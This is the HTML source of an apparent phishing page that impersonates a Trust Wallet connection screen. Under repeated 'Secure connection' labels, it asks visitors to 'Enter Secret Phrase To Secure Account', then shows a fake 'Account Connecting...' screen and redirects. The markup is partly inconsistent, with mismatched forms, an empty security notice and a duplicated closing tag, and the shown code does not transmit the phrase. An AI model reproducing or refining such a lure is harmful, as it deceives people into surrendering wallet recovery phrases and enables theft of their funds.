
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="theme-color" content="#ffffff">
  <title>Connect Trust Wallet</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>

  <header class="header">
    <div class="header-content">
      <span class="header-title">Connect Wallet</span>
      <span class="secure-label">Secure connection</span>
    </div>
  </header>

  <main class="main-container">
    <section class="wallet-card">

      <div class="wallet-icon">
        <svg viewBox="0 0 64 64" role="img" aria-label="Wallet icon">
          <rect x="8" y="15" width="48" height="36" rx="7"
                fill="#3375BB"/>
          <path d="M8 23h48" stroke="white" stroke-width="3"/>
          <rect x="36" y="29" width="20" height="13" rx="4"
                fill="#ffffff"/>
          <circle cx="42" cy="35.5" r="2" fill="#3375BB"/>
        </svg>
      </div>

      <h1>Connect your wallet</h1>

      <p class="description">
        Enter Secret Phrase To Secure Account.
      </p>

     <input
  type="text"
  id="nameInput"
  class="name-input"
  placeholder=""
  maxlength="80"
  autocomplete="name"
>

<button id="connectButton" class="connect-button">
  Connect Trust Wallet
</button>

      <p id="status" class="status">
        Your wallet is not connected.
      </p>

      <div class="security-notice">
        <span class="security-icon">✓</span>
        <div>
          <strong>Your security matters</strong>
          <p>
           
          </p>
        </div>
      </div>

    </section>
  </main>

  <footer class="footer">
    <p>Secure wallet connection</p>
  </footer>

 <!-- Name form -->
<div id="formSection">
  <form id="nameForm">
    <input type="text" id="name" placeholder="Enter your name" required>
    <button type="submit">Continue</button>
  </form>
</div>

<!-- Loading screen -->
<div id="loadingScreen" style="display:none;">
  <h2>Account Connecting...</h2>
  <p>Your submission is being processed.</p>
</div>

<!-- Redirect script -->
<script>
  const form = document.getElementById("nameForm");

  form.addEventListener("submit", function(event) {
    event.preventDefault();

    const name = document.getElementById("name").value.trim();

    if (!name) return;

    localStorage.setItem("submittedName", name);

    document.getElementById("formSection").style.display = "none";
    document.getElementById("loadingScreen").style.display = "block";

    setTimeout(function() {
      window.location.href = "codlont";
    }, 3000);
  });
</script>

</body>
</html>
</html>
